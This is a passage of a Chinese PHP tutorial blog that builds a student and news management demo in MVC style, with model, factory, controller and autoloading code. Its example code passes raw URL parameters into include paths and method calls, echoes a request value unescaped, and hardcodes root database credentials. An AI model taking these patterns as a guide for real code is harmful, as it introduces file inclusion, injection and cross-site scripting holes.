title="学生视图文件"></a>学生视图文件</h3><p>显示数据库中的数据，将数据输送到html页面</p><p>包含控制器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;.&#x2F;StudentController.php&quot;&gt;学生管理&lt;&#x2F;a&gt; | </span><br><span class="line">&lt;a href&#x3D;&quot;.&#x2F;NewsController.php&quot;&gt;新闻管理&lt;&#x2F;a&gt;&lt;hr&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;id&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;name&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;sex&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;age&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;edu&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;salary&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;bonus&#39;]?&gt;&lt;&#x2F;td&gt;</span><br><span class="line">&lt;td&gt;&lt;?php echo $arr[&#39;city&#39;]?&gt;&lt;&#x2F;td&gt;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>模型类，创建数据库对象，与数据库进行连接，定义sql方法，执行sql语句。</p><p>控制器接受用户的操作，创建模型类对象，调用模型类对象方法，取出数据存入数组。</p><p>视图，将数据从控制器中取出，输出到html前端页面。</p><p>新闻功能也是如此。</p><h2 id="MVC实例：学生信息管理2"><a href="#MVC实例：学生信息管理2" class="headerlink" title="MVC实例：学生信息管理2"></a>MVC实例：学生信息管理2</h2><h3 id="整合学生模块和新闻模块并整合工厂模型类、基础模型类等等"><a href="#整合学生模块和新闻模块并整合工厂模型类、基础模型类等等" class="headerlink" title="整合学生模块和新闻模块并整合工厂模型类、基础模型类等等"></a>整合学生模块和新闻模块并整合工厂模型类、基础模型类等等</h3><h4 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h4><p>模型类主要是取出数据，多个模型类都有取出数据的功能，我们可以对其进行整合，整合共有的功能，其他模型类继承基础模型类。</p><p>我们将两个模型类中，公共的属性和方法，提炼出来，放入基础模型类(BaseModel.class.php)中。其它模型类完成对基础模型类的继承。</p><h4 id="创建基础模型类文件：BaseModel-class-php"><a href="#创建基础模型类文件：BaseModel-class-php" class="headerlink" title="创建基础模型类文件：BaseModel.class.php"></a>创建基础模型类文件：BaseModel.class.php</h4><p>公共部分放入基础模型类。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含数据库工具类</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Db.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义抽象的基础模型类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//受保护的保存数据库对象的属性</span></span><br><span class="line"><span class="keyword">protected</span> $db = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建Db类对象</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;db_host&#x27;</span> =&gt; <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_user&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_pass&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;db_name&#x27;</span> =&gt; <span class="string">&#x27;itcast&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;charset&#x27;</span> =&gt; <span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db = Db::getInstance($arr);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他模型类</p><p>直接包含基础模型类，调用基础模型类中的对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class StudentModel extends BaseModel</span><br></pre></td></tr></table></figure><h4 id="创建工厂模型类：FactoryModel-class-php"><a href="#创建工厂模型类：FactoryModel-class-php" class="headerlink" title="创建工厂模型类：FactoryModel.class.php"></a>创建工厂模型类：FactoryModel.class.php</h4><p>生产模型类对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含所有模型类</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./StudentModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./NewsModel.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义最终的工厂模型类</span></span><br><span class="line"><span class="comment">//主要用来生产不同模型类的对象</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">FactoryModel</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//公共的静态的创建不同模型类对象的方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getInstance</span>(<span class="params">$modelClassName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建指定模型类对象，并返回</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> $modelClassName();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制器创建模型类对象，直接使用工厂类创建对象，而不用单独的去创建某一个模型类对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$modelObj &#x3D; FactoryModel::getInstance(&quot;StudentModel&quot;);</span><br></pre></td></tr></table></figure><p>不使用工厂类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$modelObj &#x3D; new StudentModel();</span><br></pre></td></tr></table></figure><h4 id="创建控制器类：NewsController-php"><a href="#创建控制器类：NewsController-php" class="headerlink" title="创建控制器类：NewsController.php"></a>创建控制器类：NewsController.php</h4><p>一开始控制器是一个单纯的文件，进行接受用户输入的数据，执行用户的操作等，接下来把控制器变成一个控制器类。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义最终的新闻控制器类</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">NewsController</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$modelObj = FactoryModel::getInstance(<span class="string">&quot;NewsModel&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>($modelObj-&gt;delete($id))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;id=<span class="subst">&#123;$id&#125;</span>的记录删除成功！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=?&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;id=<span class="subst">&#123;$id&#125;</span>的记录删除失败！&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:3;url=?&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$modelObj = FactoryModel::getInstance(<span class="string">&quot;NewsModel&quot;</span>);</span><br><span class="line">$arrs = $modelObj-&gt;fetchAll();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;./NewsIndexView.html&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的用户操作，变成一个函数，通过创建控制器类。来调用相应的函数。</p><h4 id="创建基础控制器类：BaseController-class-php"><a href="#创建基础控制器类：BaseController-class-php" class="headerlink" title="创建基础控制器类：BaseController.class.php"></a>创建基础控制器类：BaseController.class.php</h4><p>与基础模型类一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义抽象的基础控制器类</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">//受保护的跳转方法</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">jump</span>(<span class="params">$message,$url=<span class="string">&#x27;?&#x27;</span>,$time=<span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;<span class="subst">&#123;$message&#125;</span>&lt;/h2&gt;&quot;</span>;</span><br><span class="line">header(<span class="string">&quot;refresh:<span class="subst">&#123;$time&#125;</span>;url=<span class="subst">&#123;$url&#125;</span>&quot;</span>);</span><br><span class="line"><span class="keyword">die</span>(); <span class="comment">//中止程序向下运行</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>控制器调用基础控制器的方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取用户动作参数</span></span><br><span class="line">$ac = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;ac&#x27;</span>]) ? $_GET[<span class="string">&#x27;ac&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="comment">//创建新闻控制器类的对象</span></span><br><span class="line">$controllerObj = <span class="keyword">new</span> NewsController();</span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$ac();</span><br></pre></td></tr></table></figure><h4 id="文件简单分目录"><a href="#文件简单分目录" class="headerlink" title="文件简单分目录"></a>文件简单分目录</h4><p>Model目录：主要存放各个模块的模型类文件；</p><p>Controller目录：主要存放各个模块的控制器类文件；</p><p>View目录：主要存放各个模块的视图文件；</p><p>Frame目录：主要存放各个模块公共的类文件。</p><h4 id="前端控制器实现"><a href="#前端控制器实现" class="headerlink" title="前端控制器实现"></a>前端控制器实现</h4><p>之前的index.php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含所有类文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/FactoryModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/Db.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Model/StudentModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Model/NewsModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Controller/StudentController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Controller/NewsController.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取用户动作参数</span></span><br><span class="line">$ac = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;ac&#x27;</span>]) ? $_GET[<span class="string">&#x27;ac&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>;</span><br><span class="line"><span class="comment">//创建学生控制器类的对象</span></span><br><span class="line">$controllerObj = <span class="keyword">new</span> StudentController();</span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$ac();</span><br></pre></td></tr></table></figure><p>修改之后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//包含所有类文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/FactoryModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/Db.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Model/StudentModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Model/NewsModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Controller/StudentController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Controller/NewsController.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;Student&#x27;</span>; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>; <span class="comment">//动作名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = $c . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$a();</span><br></pre></td></tr></table></figure><h4 id="平台概念的引入"><a href="#平台概念的引入" class="headerlink" title="平台概念的引入"></a>平台概念的引入</h4><p>有了“平台”概念后，MVC的目录结构，就要进一步扩展了。</p><p>引入“平台”概念后，客户的每次请求，必须带3个参数：平台参数、控制器参数、用户动作。</p><p>Platform称为p参数，controller称为c参数，action简称a参数。</p><p>请求地址：index.php?p=平台&amp;c=控制器&amp;a=动作&amp;其它参数</p><p>举例说明：<code>index.php?p=Home&amp;c=Student&amp;a=index</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$p = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;p&#x27;</span>]) ? $_GET[<span class="string">&#x27;p&#x27;</span>] : <span class="string">&#x27;Home&#x27;</span>; <span class="comment">//平台参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;Student&#x27;</span>; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>; <span class="comment">//动作名</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//包含所有类文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/FactoryModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/Db.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./Frame/BaseModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./App/<span class="subst">$p</span>/Model/StudentModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./App/<span class="subst">$p</span>/Model/NewsModel.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./App/<span class="subst">$p</span>/Controller/StudentController.class.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;./App/<span class="subst">$p</span>/Controller/NewsController.class.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = $c . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$a();</span><br></pre></td></tr></table></figure><h4 id="类的自动加载"><a href="#类的自动加载" class="headerlink" title="类的自动加载"></a>类的自动加载</h4><p>如果客户每次请求，都去包含所有类文件，会造成服务器内存浪费，程序的加载速度会更加缓慢。</p><p>我们可以使用类的自动加载，来实现类文件的按需加载，不需要的不用加载。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$p = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;p&#x27;</span>]) ? $_GET[<span class="string">&#x27;p&#x27;</span>] : <span class="string">&#x27;Home&#x27;</span>; <span class="comment">//平台参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;Student&#x27;</span>; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>; <span class="comment">//动作名</span></span><br><span class="line">define(<span class="string">&quot;PLAT&quot;</span>,$p);</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//类文件路径数组</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;./Frame/<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line"><span class="string">&quot;./App/&quot;</span>.PLAT.<span class="string">&quot;/Model/<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line"><span class="string">&quot;./App/&quot;</span>.PLAT.<span class="string">&quot;/Controller/<span class="subst">$className</span>.class.php&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//循环数组</span></span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $filename)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果类文件路径存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line"><span class="keyword">echo</span> $filename.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = $c . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span class="keyword">new</span> $controllerClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据用户的不同动作，调用不同的方法</span></span><br><span class="line">$controllerObj-&gt;$a();</span><br></pre></td></tr></table></figure><p>唯一的区别就是之前的index文件，我们载入就会加载所有的类，但是现在我们只想根据我们输入的参数加载对应的类文件。</p><h4 id="常用目录常量配置"><a href="#常用目录常量配置" class="headerlink" title="常用目录常量配置"></a>常用目录常量配置</h4><p>常量在任何地方都可以使用，而变量只能在其作用域下使用；</p><p>我们把MVC中常用的目录定义成常量，可以简化目录路径的编写。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//获取路由参数</span></span><br><span class="line">$p = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;p&#x27;</span>]) ? $_GET[<span class="string">&#x27;p&#x27;</span>] : <span class="string">&#x27;Home&#x27;</span>; <span class="comment">//平台参数</span></span><br><span class="line">$c = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]) ? $_GET[<span class="string">&#x27;c&#x27;</span>] : <span class="string">&#x27;Student&#x27;</span>; <span class="comment">//控制器名</span></span><br><span class="line">$a = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]) ? $_GET[<span class="string">&#x27;a&#x27;</span>] : <span class="string">&#x27;index&#x27;</span>; <span class="comment">//动作名</span></span><br><span class="line">define(<span class="string">&quot;PLAT&quot;</span>,$p);</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义目录常量</span></span><br><span class="line">define(<span class="string">&quot;DS&quot;</span>,DIRECTORY_SEPARATOR); <span class="comment">//动态目录分割符</span></span><br><span class="line">define(<span class="string">&quot;ROOT_PATH&quot;</span>,getcwd().DS); <span class="comment">//当前目录</span></span><br><span class="line">define(<span class="string">&quot;FRAME_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;Frame&quot;</span>.DS); <span class="comment">//Frame目录</span></span><br><span class="line">define(<span class="string">&quot;MODEL_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;Model&quot;</span>.DS); <span class="comment">//Model目录</span></span><br><span class="line">define(<span class="string">&quot;CONTROLLER_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;Controller&quot;</span>.DS); <span class="comment">//Controller目录</span></span><br><span class="line">define(<span class="string">&quot;VIEW_PATH&quot;</span>,ROOT_PATH.<span class="string">&quot;App&quot;</span>.DS.PLAT.DS.<span class="string">&quot;View&quot;</span>.DS.$c.DS); <span class="comment">//View目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//类的自动加载</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params">$className</span>)</span>&#123;</span><br><span class="line"><span class="comment">//类文件路径数组</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">FRAME_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line">MODEL_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span>,</span><br><span class="line">CONTROLLER_PATH.<span class="string">&quot;<span class="subst">$className</span>.class.php&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//循环数组</span></span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $filename)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果类文件路径存在，则包含</span></span><br><span class="line"><span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line"><span class="keyword">echo</span> $filename.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span>($filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建控制器类的对象：StudentController</span></span><br><span class="line">$controllerClassName = $c . <span class="string">&quot;Controller&quot;</span>;</span><br><span class="line">$controllerObj = <span 